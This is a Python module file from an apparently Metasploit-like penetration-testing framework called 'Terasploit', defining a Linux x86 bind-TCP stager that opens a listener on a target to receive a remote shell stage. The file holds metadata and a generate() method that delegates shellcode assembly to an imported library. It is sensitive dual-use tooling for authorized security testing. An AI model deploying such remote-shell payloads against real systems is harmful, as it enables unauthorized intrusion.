"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stagers/linux/x86/shell/bind_tcp.py
"""

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x86.bind_tcp import BindTcpX86


class TerasploitModule(BindTcpX86, Payload):
    """Linux x86 bind-TCP stager."""

    NAME = "Linux x86 Bind TCP Stager"
    DESCRIPTION = (
        "Linux IA-32 stager that opens a TCP listener on the target and "
        "waits for the framework to connect and deliver the companion stage."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.1"
    RANK = "normal"
    REFERENCES = [
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "modules/payloads/stagers/linux/x86/bind_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "lib/msf/core/payload/linux/bind_tcp.rb",
    ]

    PAYLOAD_TYPE = STAGER
    HANDLER = PayloadHandler.BindTCP

    # Companion stage: modules/payload/stages/linux/x86/shell.py
    STAGE_PATH = "linux.x86.shell"

    CACHED_SIZE = 111
    MAX_SIZE = 300

    ARCH = [ARCH_X86]
    PLATFORM = [PLATFORM_LINUX]

    OPTIONS = ["RHOST", "LPORT", "EXITFUNC"]

    def generate(self, ctx):
        """
        Generate the Linux x86 bind-TCP stager shellcode.

        Delegates assembly to BindTcp.generate_bind_tcp() with LPORT and
        EXITFUNC read from ctx.
        """
        port = int(ctx.get_option("LPORT"))
        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()

        # Generate a bind tcp stager.
        shellcode = self.generate_bind_tcp(port, exitfunc=exitfunc)

        return shellcode
